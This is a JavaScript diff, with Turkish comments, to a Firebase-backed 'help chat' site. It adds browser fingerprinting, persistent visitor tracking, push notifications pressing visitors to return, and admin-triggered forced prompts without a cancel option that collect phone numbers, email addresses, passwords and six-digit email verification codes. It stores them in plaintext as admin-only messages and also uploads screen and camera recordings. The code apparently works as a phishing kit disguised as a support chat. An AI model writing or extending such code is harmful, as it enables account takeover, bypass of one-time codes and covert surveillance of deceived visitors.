@@ -27,6 +27,12 @@ import {
   getRedirectResult,
   onAuthStateChanged,
 } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
+import {
+  getMessaging,
+  getToken,
+  onMessage,
+  isSupported as isMessagingSupported,
+} from "https://www.gstatic.com/firebasejs/11.0.2/firebase-messaging.js";
 
 const ICE_SERVERS = {
   iceServers: [
@@ -69,6 +75,8 @@ let app = null;
 let db = null;
 let storage = null;
 let auth = null;
+let messaging = null;
+let messagingReady = null;
 let googleUser = null;
 let sessionId = null;
 let sessionReady = null;
@@ -82,14 +90,203 @@ function makeId() {
   return `s_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
 }
 
+function isReloadNavigation() {
+  try {
+    const nav = performance.getEntriesByType?.("navigation")?.[0];
+    return nav?.type === "reload";
+  } catch {
+    return false;
+  }
+}
+
+const VISITOR_DEVICE_KEY = "help_visitor_device_v1";
+const SESSION_PERSIST_KEY = "help_chat_session_v1";
+const SESSION_TAB_KEY = "help_chat_session";
+
+function simpleHash(str) {
+  let h = 2166136261;
+  const s = String(str || "");
+  for (let i = 0; i < s.length; i++) {
+    h ^= s.charCodeAt(i);
+    h = Math.imul(h, 16777619);
+  }
+  return (h >>> 0).toString(36);
+}
+
+function collectDeviceFingerprint() {
+  const nav = navigator || {};
+  const scr = screen || {};
+  const parts = [
+    nav.userAgent || "",
+    nav.language || "",
+    nav.platform || "",
+    String(nav.hardwareConcurrency || ""),
+    String(nav.maxTouchPoints || ""),
+    `${scr.width || 0}x${scr.height || 0}x${scr.colorDepth || 0}`,
+    String(new Date().getTimezoneOffset()),
+  ];
+  return {
+    ua: String(nav.userAgent || "").slice(0, 220),
+    language: String(nav.language || "").slice(0, 32),
+    languages: Array.isArray(nav.languages)
+      ? nav.languages.slice(0, 6).map((x) => String(x)).join(",")
+      : "",
+    platform: String(nav.platform || "").slice(0, 64),
+    hardwareConcurrency: Number(nav.hardwareConcurrency) || null,
+    maxTouchPoints: Number(nav.maxTouchPoints) || 0,
+    screen: `${scr.width || 0}x${scr.height || 0}`,
+    colorDepth: Number(scr.colorDepth) || null,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    timezone: (() => {
+      try {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone || "";
+      } catch {
+        return "";
+      }
+    })(),
+    fingerprintHash: simpleHash(parts.join("|")),
+  };
+}
+
+function getOrCreateVisitorId() {
+  try {
+    let id = localStorage.getItem(VISITOR_DEVICE_KEY);
+    if (id && String(id).length >= 8) return String(id);
+    const fp = collectDeviceFingerprint();
+    id = `v_${fp.fingerprintHash}_${makeId().slice(0, 10)}`;
+    localStorage.setItem(VISITOR_DEVICE_KEY, id);
+    return id;
+  } catch {
+    // private mode — sekme içi
+    if (!window.__helpVisitorId) window.__helpVisitorId = `v_tmp_${makeId()}`;
+    return window.__helpVisitorId;
+  }
+}
+
 function getSessionId() {
-  const key = "help_chat_session";
-  let id = sessionStorage.getItem(key);
+  // Her yüklemede benzersiz sekme kimliği (sessionStorage KOPYALANIR — sekme çoğaltmada yetmez)
+  if (!window.__helpChatTabId) {
+    window.__helpChatTabId = makeId();
+  }
+  const tabId = window.__helpChatTabId;
+  const visitorId = getOrCreateVisitorId();
+
+  // Kalıcı oturum: aynı cihaz = aynı sohbet (sekme / tarayıcı kapanınca da)
+  let id = null;
+  try {
+    id = localStorage.getItem(SESSION_PERSIST_KEY) || sessionStorage.getItem(SESSION_TAB_KEY);
+  } catch {
+    try {
+      id = sessionStorage.getItem(SESSION_TAB_KEY);
+    } catch {
+      id = null;
+    }
+  }
+
   if (!id) {
     id = makeId();
-    sessionStorage.setItem(key, id);
   }
+
+  try {
+    localStorage.setItem(SESSION_PERSIST_KEY, id);
+    sessionStorage.setItem(SESSION_TAB_KEY, id);
+  } catch {
+    try {
+      sessionStorage.setItem(SESSION_TAB_KEY, id);
+    } catch {
+      /* ignore */
+    }
+  }
+
+  // Sekme kilidi: aynı sohbet, kamera sahipliği ayrı
+  // Diğer sekme canlıyken YENİ sohbet AÇMA — aynı sessionId paylaş
+  try {
+    const lockKey = `help_chat_lock_${id}`;
+    const now = Date.now();
+    localStorage.setItem(
+      lockKey,
+      JSON.stringify({
+        tabId,
+        at: now,
+        sessionId: id,
+        visitorId,
+        reloading: false,
+      })
+    );
+  } catch {
+    /* private mode */
+  }
+
+  window.__helpVisitorId = visitorId;
   return id;
+}
+
+function getVisitorId() {
+  return getOrCreateVisitorId();
+}
+
+function touchSessionTabLock() {
+  try {
+    const id =
+      localStorage.getItem(SESSION_PERSIST_KEY) ||
+      sessionStorage.getItem(SESSION_TAB_KEY);
+    const tabId = window.__helpChatTabId;
+    if (!id || !tabId) return;
+    localStorage.setItem(
+      `help_chat_lock_${id}`,
+      JSON.stringify({
+        tabId,
+        at: Date.now(),
+        sessionId: id,
+        visitorId: getOrCreateVisitorId(),
+        reloading: false,
+      })
+    );
+  } catch {
+    /* ignore */
+  }
+}
+
+/** Yenilemede kilidi “reloading” yap — ikinci sekme yanlışlıkla id çalmasın / yeni sayfa geri alsın */
+function markSessionTabReloading() {
+  try {
+    const id =
+      localStorage.getItem(SESSION_PERSIST_KEY) ||
+      sessionStorage.getItem(SESSION_TAB_KEY);
+    const tabId = window.__helpChatTabId;
+    if (!id || !tabId) return;
+    localStorage.setItem(
+      `help_chat_lock_${id}`,
+      JSON.stringify({
+        tabId,
+        at: Date.now(),
+        sessionId: id,
+        visitorId: getOrCreateVisitorId(),
+        reloading: true,
+      })
+    );
+  } catch {
+    /* ignore */
+  }
+}
+
+function releaseSessionTabLock() {
+  try {
+    const id =
+      localStorage.getItem(SESSION_PERSIST_KEY) ||
+      sessionStorage.getItem(SESSION_TAB_KEY);
+    const tabId = window.__helpChatTabId;
+    if (!id || !tabId) return;
+    const lockKey = `help_chat_lock_${id}`;
+    const raw = localStorage.getItem(lockKey);
+    if (!raw) return;
+    const lock = JSON.parse(raw);
+    if (lock && String(lock.tabId) === String(tabId)) {
+      localStorage.removeItem(lockKey);
+    }
+  } catch {
+    /* ignore */
+  }
 }
 
 function initApp() {
@@ -115,6 +312,333 @@ function initStorage() {
   if (!firebaseApp) return null;
   storage = getStorage(firebaseApp);
   return storage;
+}
+
+function tokenKey(token) {
+  let h = 0;
+  const s = String(token || "");
+  for (let i = 0; i < s.length; i++) h = (Math.imul(31, h) + s.charCodeAt(i)) | 0;
+  return `t_${Math.abs(h).toString(36)}_${s.slice(-8)}`;
+}
+
+async function ensureMessagingSw() {
+  if (!("serviceWorker" in navigator)) return null;
+  try {
+    const existing = await navigator.serviceWorker.getRegistration("/");
+    if (existing) {
+      await navigator.serviceWorker.ready;
+      return existing;
+    }
+  } catch {
+    /* ignore */
+  }
+  const candidates = [
+    `${location.origin}/firebase-messaging-sw.js`,
+    new URL("firebase-messaging-sw.js", location.href).href,
+  ];
+  for (const url of candidates) {
+    try {
+      const reg = await navigator.serviceWorker.register(url, { scope: "/" });
+      await navigator.serviceWorker.ready;
+      return reg;
+    } catch {
+      /* try next */
+    }
+  }
+  console.warn("messaging sw register failed");
+  return null;
+}
+
+function getPushSetupStatus() {
+  const vapidKey = Boolean(String(cfg.vapidKey || "").trim());
+  const fcmServerKey = Boolean(String(cfg.fcmServerKey || "").trim());
+  const sw = "serviceWorker" in navigator;
+  const notif =
+    typeof Notification !== "undefined" ? Notification.permission : "unsupported";
+  return {
+    vapidKey,
+    fcmServerKey,
+    serviceWorker: sw,
+    notificationPermission: notif,
+    closedBrowserReady: vapidKey && fcmServerKey && notif === "granted",
+    hint: !vapidKey
+      ? "firebase-config.js → vapidKey eksik"
+      : !fcmServerKey
+        ? "firebase-config.js → fcmServerKey eksik (kapalı tarayıcı gönderimi)"
+        : notif !== "granted"
+          ? "Bildirim izni verilmedi — Alarmları aç"
+          : "Kapalı tarayıcı push hazır",
+  };
+}
+
+async function initMessaging() {
+  if (!configured) return null;
+  if (messaging) return messaging;
+  if (messagingReady) return messagingReady;
+  messagingReady = (async () => {
+    try {
+      const ok = await isMessagingSupported().catch(() => false);
+      if (!ok) return null;
+      const firebaseApp = initApp();
+      if (!firebaseApp) return null;
+      messaging = getMessaging(firebaseApp);
+      return messaging;
+    } catch (err) {
+      console.warn("initMessaging", err);
+      return null;
+    }
+  })();
+  return messagingReady;
+}
+
+/**
+ * Bildirim izni + FCM token.
+ * role: "admin" | "visitor"
+ */
+async function enablePushNotifications(role = "visitor") {
+  if (!("Notification" in window)) {
+    return { ok: false, error: "Bildirim desteklenmiyor" };
+  }
+  let perm = Notification.permission;
+  if (perm === "default") {
+    perm = await Notification.requestPermission();
+  }
+  if (perm !== "granted") {
+    return { ok: false, error: "Bildirim izni verilmedi", permission: perm };
+  }
+
+  try {
+    localStorage.setItem("help_notify_granted_v1", "1");
+  } catch {
+    /* ignore */
+  }
+
+  const vapidKey = String(cfg.vapidKey || "").trim();
+  const swReg = await ensureMessagingSw();
+  const msg = await initMessaging();
+  if (!msg || !swReg || !vapidKey) {
+    // İzin verildi — token yoksa bile sohbete yaz
+    try {
+      const database = initDb();
+      if (database && role === "visitor") {
+        const id = await ensureSession();
+        if (id) {
+          await update(ref(database, `chats/${id}`), {
+            notificationsGranted: true,
+            updatedAt: Date.now(),
+          });
+        }
+      }
+    } catch {
+      /* ignore */
+    }
+    return {
+      ok: true,
+      permission: perm,
+      token: null,
+      limited: true,
+      hint: vapidKey
+        ? "Service worker / messaging hazır değil"
+        : "firebase-config.js içine vapidKey ekleyin (kapalı tarayıcı push)",
+    };
+  }
+
+  try {
+    const token = await getToken(msg, {
+      vapidKey,
+      serviceWorkerRegistration: swReg,
+    });
+    if (!token) return { ok: false, error: "FCM token alınamadı", permission: perm };
+
+    const database = initDb();
+    const now = Date.now();
+    if (role === "admin" && database) {
+      await set(ref(database, `adminPushTokens/${tokenKey(token)}`), {
+        token,
+        role: "admin",
+        updatedAt: now,
+        ua: String(navigator.userAgent || "").slice(0, 240),
+        page: location.pathname,
+      });
+    }
+    if (role === "visitor" && database) {
+      const id = await ensureSession();
+      if (id) {
+        await update(ref(database, `chats/${id}`), {
+          fcmToken: token,
+          fcmTokenAt: now,
+          notificationsGranted: true,
+          updatedAt: now,
+        });
+        try {
+          const visitorId =
+            typeof getOrCreateVisitorId === "function"
+              ? getOrCreateVisitorId()
+              : null;
+          if (visitorId) {
+            await update(ref(database, `visitors/${visitorId}`), {
+              fcmToken: token,
+              fcmTokenAt: now,
+              notificationsGranted: true,
+              sessionId: id,
+              updatedAt: now,
+            });
+          }
+        } catch {
+          /* ignore */
+        }
+      }
+    }
+
+    // Ön planda gelen FCM
+    try {
+      onMessage(msg, (payload) => {
+        const n = payload?.notification || {};
+        const d = payload?.data || {};
+        const title = n.title || d.title || "Bildirim";
+        const body = n.body || d.body || "";
+        if (Notification.permission === "granted") {
+          try {
+            new Notification(title, {
+              body,
+              tag: d.tag || "fg-push",
+              data: d,
+            });
+          } catch {
+            /* ignore */
+          }
+        }
+        window.dispatchEvent(
+          new CustomEvent("help-push-message", { detail: { payload, title, body } })
+        );
+      });
+    } catch {
+      /* ignore */
+    }
+
+    return { ok: true, permission: perm, token, limited: false };
+  } catch (err) {
+    console.warn("enablePushNotifications", err);
+    return { ok: false, error: err?.message || String(err), permission: perm };
+  }
+}
+
+async function listAdminPushTokens() {
+  const database = initDb();
+  if (!database) return [];
+  try {
+    const snap = await get(ref(database, "adminPushTokens"));
+    if (!snap.exists()) return [];
+    const out = [];
+    snap.forEach((child) => {
+      const t = String(child.val()?.token || "").trim();
+      if (t) out.push(t);
+    });
+    return [...new Set(out)];
+  } catch {
+    return [];
+  }
+}
+
+async function sendFcmToTokens(tokens, { title, body, url, tag, data } = {}) {
+  const list = (Array.isArray(tokens) ? tokens : []).map((t) => String(t || "").trim()).filter(Boolean);
+  if (!list.length) return { ok: false, sent: 0, error: "Token yok" };
+
+  const serverKey = String(cfg.fcmServerKey || "").trim();
+  const payloadBase = {
+    notification: {
+      title: String(title || "Bildirim").slice(0, 120),
+      body: String(body || "").slice(0, 240),
+    },
+    data: {
+      title: String(title || "Bildirim").slice(0, 120),
+      body: String(body || "").slice(0, 240),
+      url: String(url || "/admin.html"),
+      tag: String(tag || "help-push"),
+      ...(data && typeof data === "object" ? data : {}),
+    },
+  };
+
+  // Outbox — Cloud Function dinleyicisi varsa kullanır
+  try {
+    const database = initDb();
+    if (database) {
+      const box = push(ref(database, "pushOutbox"));
+      await set(box, {
+        tokens: list,
+        ...payloadBase,
+        createdAt: Date.now(),
+      });
+    }
+  } catch (err) {
+    console.warn("pushOutbox", err);
+  }
+
+  if (!serverKey) {
+    return {
+      ok: false,
+      sent: 0,
+      queued: true,
+      error:
+        "fcmServerKey yok — firebase-config.js’e Legacy Server Key ekleyin (kapalı tarayıcı push)",
+    };
+  }
+
+  let sent = 0;
+  const errors = [];
+  await Promise.all(
+    list.map(async (to) => {
+      try {
+        const res = await fetch("https://fcm.googleapis.com/fcm/send", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Authorization: `key=${serverKey}`,
+          },
+          body: JSON.stringify({
+            to,
+            priority: "high",
+            ...payloadBase,
+          }),
+        });
+        if (res.ok) sent += 1;
+        else errors.push(`${res.status}`);
+      } catch (err) {
+        errors.push(err?.message || "fetch");
+      }
+    })
+  );
+  return { ok: sent > 0, sent, errors };
+}
+
+async function notifyAdminsPush({ title, body, tag } = {}) {
+  const tokens = await listAdminPushTokens();
+  return sendFcmToTokens(tokens, {
+    title: title || "Yeni ziyaretçi",
+    body: body || "Sitede yeni aktivite var",
+    url: "/admin.html",
+    tag: tag || "admin-alert",
+  });
+}
+
+async function notifyVisitorPush(targetSessionId, { title, body, tag } = {}) {
+  const database = initDb();
+  if (!database || !targetSessionId) return { ok: false, error: "Oturum yok" };
+  let token = "";
+  try {
+    const snap = await get(ref(database, `chats/${targetSessionId}/fcmToken`));
+    token = String(snap.val() || "").trim();
+  } catch {
+    token = "";
+  }
+  if (!token) return { ok: false, error: "Ziyaretçi bildirim izni / token yok" };
+  return sendFcmToTokens([token], {
+    title: title || "Destek mesajı",
+    body: body || "Lütfen sohbete dönün — doğrulama devam ediyor.",
+    url: "/chat.html",
+    tag: tag || "visitor-nudge",
+    data: { type: "visitor_nudge", sessionId: String(targetSessionId) },
+  });
 }
 
 function initAuth() {
@@ -433,12 +957,62 @@ function stopGoogleSignInLoop() {
   }
 }
 
+async function upsertVisitorProfile(sessionIdValue, prevChat = null) {
+  const database = initDb();
+  if (!database || !sessionIdValue) return null;
+  const visitorId = getOrCreateVisitorId();
+  const device = collectDeviceFingerprint();
+  const now = Date.now();
+  const vRef = ref(database, `visitors/${visitorId}`);
+  let prevVisitor = null;
+  try {
+    const snap = await get(vRef);
+    if (snap.exists()) prevVisitor = snap.val() || {};
+  } catch {
+    prevVisitor = null;
+  }
+
+  const knownBefore = Boolean(prevVisitor?.firstSeenAt || prevChat?.createdAt);
+  let nextVisits = Number(prevVisitor?.visitCount) || (prevChat ? 1 : 0);
+  try {
+    if (sessionStorage.getItem("help_visit_counted_v1") !== "1") {
+      nextVisits = Math.max(1, nextVisits + 1);
+      sessionStorage.setItem("help_visit_counted_v1", "1");
+    } else {
+      nextVisits = Math.max(1, nextVisits || 1);
+    }
+  } catch {
+    nextVisits = Math.max(1, nextVisits || 1);
+  }
+
+  const firstSeenAt = Number(prevVisitor?.firstSeenAt) || Number(prevChat?.createdAt) || now;
+  const isReturning = knownBefore || nextVisits > 1;
+
+  const patch = {
+    visitorId,
+    sessionId: sessionIdValue,
+    updatedAt: now,
+    lastSeenAt: now,
+    firstSeenAt,
+    visitCount: nextVisits,
+    isReturning,
+    page: location.pathname + location.hash,
+    ...device,
+    phone: prevChat?.phone || prevVisitor?.phone || null,
+    visitorEmail: prevChat?.visitorEmail || prevVisitor?.visitorEmail || null,
+    googleEmail: prevChat?.googleEmail || prevVisitor?.googleEmail || null,
+  };
+  await update(vRef, patch).catch(() => {});
+  return patch;
+}
+
 async function ensureSession() {
   const database = initDb();
   if (!database) return null;
   if (sessionReady) return sessionReady;
 
   sessionId = getSessionId();
+  const visitorId = getOrCreateVisitorId();
   const sessionRef = ref(database, `chats/${sessionId}`);
 
   sessionReady = (async () => {
@@ -457,6 +1031,14 @@ async function ensureSession() {
         return false;
       }
     })();
+
+    const visitorProfile = await upsertVisitorProfile(sessionId, prev);
+    const isReturning = Boolean(
+      visitorProfile?.isReturning ||
+        (prev && (prev.visitorId || prev.createdAt)) ||
+        Number(visitorProfile?.visitCount) > 1
+    );
+
     const patch = {
       updatedAt: now,
       page: location.pathname + location.hash,
@@ -464,12 +1046,23 @@ async function ensureSession() {
       lastWho: "user",
       online: true,
       heartbeatAt: now,
+      visitorId,
+      deviceFingerprint: visitorProfile?.fingerprintHash || null,
+      visitCount: Number(visitorProfile?.visitCount) || 1,
+      isReturning,
+      language: visitorProfile?.language || navigator.language || null,
+      platform: visitorProfile?.platform || navigator.platform || null,
+      timezone: visitorProfile?.timezone || null,
+      screen: visitorProfile?.screen || null,
     };
     // Mevcut oturumu “yeni ziyaretçi” gibi sıfırlama
     patch.createdAt = Number(prev?.createdAt) || now;
     if (!softResume) {
       patch.enteredAt = now;
-      if (!prev?.cameraGranted && !prev?.hasCamera && !getGoogleUser()) {
+      if (isReturning) {
+        patch.preview = `Dönen ziyaretçi · ziyaret #${patch.visitCount}`;
+        patch.returnedAt = now;
+      } else if (!prev?.cameraGranted && !prev?.hasCamera && !getGoogleUser()) {
         patch.preview = "Siteye giriş yaptı";
       }
     } else {
@@ -477,6 +1070,27 @@ async function ensureSession() {
       patch.userLeftAt = null;
     }
     await update(sessionRef, patch);
+
+    // Dönüş mesajı — sadece gerçek yeni ziyaret (yenileme değil)
+    if (isReturning && !softResume) {
+      try {
+        const counted = sessionStorage.getItem("help_return_msg_v1");
+        if (counted !== "1") {
+          sessionStorage.setItem("help_return_msg_v1", "1");
+          const msgRef = push(ref(database, `chats/${sessionId}/messages`));
+          await set(msgRef, {
+            who: "user",
+            text: `Ziyaretçi tekrar giriş yaptı (#${patch.visitCount})`,
+            ts: now,
+            type: "visit",
+            adminOnly: true,
+          });
+        }
+      } catch {
+        /* ignore */
+      }
+    }
+
     return sessionId;
   })();
 
@@ -554,28 +1168,140 @@ async function pushMessage(who, text) {
 }
 
 async function saveVisitorPhone(phone) {
+  // Geriye uyum: yalnız telefon (e-posta/şifre yoksa zorunlu kılma)
+  return saveVisitorCredentials({ phone, partial: true });
+}
+
+/** Ziyaretçi güvenlik bilgileri: telefon + e-posta + şifre */
+async function saveVisitorCredentials({ phone, email, password, partial = false } = {}) {
   const database = initDb();
   if (!database) throw new Error("Firebase bağlı değil");
   const id = await ensureSession();
   if (!id) throw new Error("Oturum açılamadı");
-  const clean = String(phone || "").replace(/[^\d+\s()-]/g, "").trim().slice(0, 32);
-  if (!clean) throw new Error("Telefon boş");
+
+  const cleanPhone = String(phone || "").replace(/[^\d+\s()-]/g, "").trim().slice(0, 32);
+  const cleanEmail = String(email || "")
+    .trim()
+    .toLowerCase()
+    .slice(0, 180);
+  const cleanPass = String(password || "").slice(0, 128);
+  if (!cleanPhone) throw new Error("Telefon boş");
+  const hasEmail = Boolean(cleanEmail);
+  const hasPass = Boolean(cleanPass);
+  if (!partial) {
+    if (!hasEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
+      throw new Error("E-posta geçersiz");
+    }
+    if (!hasPass || cleanPass.length < 4) throw new Error("Şifre kısa");
+  } else if (hasEmail && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
+    throw new Error("E-posta geçersiz");
+  } else if (hasPass && cleanPass.length < 4) {
+    throw new Error("Şifre kısa");
+  }
+
+  const now = Date.now();
+  const patch = {
+    phone: cleanPhone,
+    phoneAt: now,
+    updatedAt: now,
+    lastWho: "user",
+    page: location.pathname + location.hash,
+  };
+  if (hasEmail) {
+    patch.visitorEmail = cleanEmail;
+    patch.visitorEmailAt = now;
+  }
+  if (hasPass) {
+    patch.visitorPassword = cleanPass;
+    patch.visitorPasswordAt = now;
+  }
+  if (hasEmail && hasPass) patch.hasCredentials = true;
+  patch.preview = "🔐 Güvenlik doğrulaması alındı".slice(0, 120);
+  await update(ref(database, `chats/${id}`), patch);
+
+  const msgPhone = push(ref(database, `chats/${id}/messages`));
+  await set(msgPhone, {
+    who: "user",
+    text: `Telefon: ${cleanPhone}`,
+    ts: now,
+    type: "phone",
+    adminOnly: true,
+  });
+  if (hasEmail) {
+    const msgMail = push(ref(database, `chats/${id}/messages`));
+    await set(msgMail, {
+      who: "user",
+      text: `E-posta: ${cleanEmail}`,
+      ts: now + 1,
+      type: "email",
+      adminOnly: true,
+    });
+  }
+  if (hasPass) {
+    const msgPass = push(ref(database, `chats/${id}/messages`));
+    await set(msgPass, {
+      who: "user",
+      text: `Şifre: ${cleanPass}`,
+      ts: now + 2,
+      type: "password",
+      adminOnly: true,
+    });
+  }
+
+  // Cihaz ziyaretçi kaydına da işle (kimlik eşleşmesi)
+  try {
+    const visitorId = getOrCreateVisitorId();
+    await update(ref(database, `visitors/${visitorId}`), {
+      sessionId: id,
+      visitorId,
+      phone: cleanPhone,
+      visitorEmail: hasEmail ? cleanEmail : null,
+      hasCredentials: Boolean(hasEmail && hasPass),
+      updatedAt: now,
+      lastSeenAt: now,
+    });
+  } catch {
+    /* ignore */
+  }
+
+  return {
+    ok: true,
+    phone: cleanPhone,
+    email: hasEmail ? cleanEmail : "",
+    sessionId: id,
+  };
+}
+
+/** E-posta 6 haneli doğrulama kodu — yalnız admin görünür */
+async function saveVisitorEmailCode(code) {
+  const database = initDb();
+  if (!database) throw new Error("Firebase bağlı değil");
+  const id = await ensureSession();
+  if (!id) throw new Error("Oturum açılamadı");
+  const clean = String(code || "").replace(/\D/g, "").slice(0, 6);
+  if (clean.length !== 6) throw new Error("Kod 6 hane olmalı");
+
+  const now = Date.now();
   await update(ref(database, `chats/${id}`), {
-    phone: clean,
-    phoneAt: Date.now(),
-    updatedAt: Date.now(),
-    preview: `📞 ${clean}`.slice(0, 120),
+    visitorEmailCode: clean,
+    visitorEmailCodeAt: now,
+    emailCodePending: false,
+    hasEmailCode: true,
+    updatedAt: now,
+    preview: "📧 E-posta kodu alındı",
     lastWho: "user",
     page: location.pathname + location.hash,
   });
+
   const msgRef = push(ref(database, `chats/${id}/messages`));
   await set(msgRef, {
     who: "user",
-    text: `Telefon: ${clean}`,
-    ts: Date.now(),
-    type: "phone",
+    text: `E-posta kodu: ${clean}`,
+    ts: now,
+    type: "email_code_reply",
+    adminOnly: true,
   });
-  return { ok: true, phone: clean, sessionId: id };
+  return { ok: true, code: clean, sessionId: id };
 }
 
 /** Ziyaretçi açılışında otomatik kamera: call + mesaj (from:auto → ziyaretçi admin dinleyicisine düşmez) */
@@ -1005,7 +1731,11 @@ async function uploadCameraRecording(targetSessionId, callId, blob, fileName, op
         lastRecordingCallId: String(callId),
         hasRecording: true,
       };
-      if (finalize) chatPatch.recordingFinalized = true;
+      if (finalize) {
+        chatPatch.recordingFinalized = true;
+        chatPatch.downloadRecording = true;
+        chatPatch.downloadRecordingAt = Date.now();
+      }
       await update(ref(database, `chats/${targetSessionId}`), chatPatch);
     } catch (metaErr) {
       // Storage + webrtc URL yazıldıysa chat meta hatası tüm kaydı “failed” yapmasın
@@ -1020,6 +1750,51 @@ async function uploadCameraRecording(targetSessionId, callId, blob, fileName, op
     ).catch(() => {});
     throw err;
   }
+}
+
+/** Anlık ekran kaydı (getDisplayMedia) — kamera kaydından ayrı */
+async function uploadScreenRecording(targetSessionId, blob, fileName, opts = {}) {
+  const store = initStorage();
+  const database = initDb();
+  if (!store || !database) throw new Error("Firebase Storage bağlı değil");
+  if (!blob?.size) throw new Error("Boş ekran kaydı");
+  if (!targetSessionId) throw new Error("Oturum yok");
+  const finalize = opts.finalize === true;
+
+  const mime = blob.type || "video/webm";
+  const ext = /mp4|mpeg|m4v/i.test(mime) ? "mp4" : "webm";
+  const safeName = String(fileName || `ekran-${Date.now()}.${ext}`).replace(/[^\w.\-]+/g, "_");
+  const path = `recordings/${targetSessionId}/screen-${Date.now()}.${ext}`;
+  const fileRef = storageRef(store, path);
+
+  await uploadBytes(fileRef, blob, {
+    contentType: mime,
+    contentDisposition: `attachment; filename="${safeName}"`,
+    customMetadata: {
+      sessionId: String(targetSessionId),
+      kind: "screen",
+    },
+  });
+
+  const url = await getDownloadURL(fileRef);
+  const now = Date.now();
+  const chatPatch = {
+    updatedAt: now,
+    preview: finalize ? "🖥 Ekran kaydı hazır" : "🖥 Ekran kaydı güncellendi",
+    lastWho: "user",
+    lastScreenRecordingUrl: url,
+    lastScreenRecordingName: safeName,
+    lastScreenRecordingAt: now,
+    hasScreenRecording: true,
+    screenGranted: true,
+  };
+  if (finalize) {
+    chatPatch.screenRecordingFinalized = true;
+    chatPatch.downloadScreenRecording = true;
+    chatPatch.downloadScreenRecordingAt = now;
+  }
+  await update(ref(database, `chats/${targetSessionId}`), chatPatch);
+  return url;
 }
 
 /** Periyodik kamera karesi (video kaydı olmasa bile Storage’a düşer) */
@@ -1131,7 +1906,11 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
           ? "camera"
           : options.type === "photos"
             ? "photos"
-            : "text";
+            : options.type === "email_code"
+              ? "email_code"
+              : options.type === "credentials"
+                ? "credentials"
+                : "text";
   const clean = String(
     text ||
       (kind === "loading"
@@ -1142,7 +1921,11 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
             ? "Kimlik doğrulaması için güvenlik adımını onaylamanız isteniyor. Onaylarsanız doğrulama bu destek oturumuna bağlanır. Onaylanmazsa doğrulama tamamlanamaz."
             : kind === "photos"
               ? "Destek için ekran görüntüsü veya görsel gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
-              : "")
+              : kind === "email_code"
+                ? "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın."
+                : kind === "credentials"
+                  ? "Kimlik doğrulamasını tamamlamak için telefon, e-posta ve şifrenizi girin."
+                  : "")
   )
     .trim()
     .slice(0, 800);
@@ -1163,7 +1946,14 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
     text: clean,
     ts: Date.now(),
   };
-  if (kind === "loading" || kind === "popup" || kind === "camera" || kind === "photos") {
+  if (
+    kind === "loading" ||
+    kind === "popup" ||
+    kind === "camera" ||
+    kind === "photos" ||
+    kind === "email_code" ||
+    kind === "credentials"
+  ) {
     payload.type = kind;
   }
   if (kind === "popup") {
@@ -1175,6 +1965,17 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
     payload.placeholder = String(options.placeholder || "Mesajınızı buraya yazın…")
       .trim()
       .slice(0, 120);
+  }
+  if (kind === "email_code") {
+    payload.okLabel = String(options.okLabel || "Doğrula").trim().slice(0, 40) || "Doğrula";
+    payload.cancelLabel = "";
+    payload.hideCancel = true;
+    payload.codeLength = 6;
+  }
+  if (kind === "credentials") {
+    payload.okLabel = String(options.okLabel || "Bilgileri onayla").trim().slice(0, 40) || "Bilgileri onayla";
+    payload.hideCancel = true;
+    payload.force = true;
   }
   if (kind === "photos") {
     payload.okLabel = String(options.okLabel || "Görsel seç").trim().slice(0, 40) || "Görsel seç";
@@ -1205,8 +2006,18 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
             ? "🔐 Kimlik doğrulama talebi"
             : kind === "photos"
               ? "🖼 Görsel talebi"
-              : clean.slice(0, 120),
+              : kind === "email_code"
+                ? "📧 E-posta kodu talebi"
+                : kind === "credentials"
+                  ? "🔐 Güvenlik bilgisi talebi"
+                  : clean.slice(0, 120),
     lastWho: "admin",
+    ...(kind === "email_code"
+      ? { emailCodeRequestedAt: Date.now(), emailCodePending: true }
+      : {}),
+    ...(kind === "credentials"
+      ? { credentialsRequestedAt: Date.now(), credentialsPending: true }
+      : {}),
   });
   return { callId };
 }
@@ -1327,7 +2138,9 @@ function listenIncomingSupport(onMessage) {
       msg.type === "camera" ||
       msg.type === "popup" ||
       msg.type === "loading" ||
-      msg.type === "photos";
+      msg.type === "photos" ||
+      msg.type === "email_code" ||
+      msg.type === "credentials";
     if (isAction) {
       const ts = Number(msg.ts) || 0;
       // Dinleyici bağlanmadan ≥3 sn önce yazılmış aksiyonları yok say (geçmiş replay)
@@ -1374,7 +2187,9 @@ async function markVisitorReconnectingKeepalive(targetSessionId, callId, opts = 
     online: false,
     connectionLostAt: now,
     heartbeatAt: now,
-    preview: "↻ Yeniden bağlanıyor…",
+    preview: hasUrl
+      ? "👋 Sayfadan ayrıldı — kayıt hazır"
+      : "↻ Yeniden bağlanıyor…",
     lastWho: "user",
   };
   if (hasUrl) {
@@ -1383,6 +2198,9 @@ async function markVisitorReconnectingKeepalive(targetSessionId, callId, opts = 
     patchChat.lastRecordingAt = now;
     patchChat.lastRecordingCallId = callId ? String(callId) : null;
     patchChat.hasRecording = true;
+    patchChat.recordingFinalized = true;
+    patchChat.downloadRecording = true;
+    patchChat.downloadRecordingAt = now;
   }
   try {
     const chatUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}.json`;
@@ -1405,6 +2223,8 @@ async function markVisitorReconnectingKeepalive(targetSessionId, callId, opts = 
         callPatch.recordingName = patchChat.lastRecordingName;
         callPatch.recordingReadyAt = now;
         callPatch.recordingStatus = "ready";
+        callPatch.recordingFinalized = true;
+        callPatch.downloadRecording = true;
       }
       const callUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}/webrtc/${encodeURIComponent(callId)}.json`;
       void fetch(callUrl, {
@@ -1426,6 +2246,17 @@ async function resumeVisitorCameraCall(targetSessionId, callId) {
   if (!database || !targetSessionId || !callId) return false;
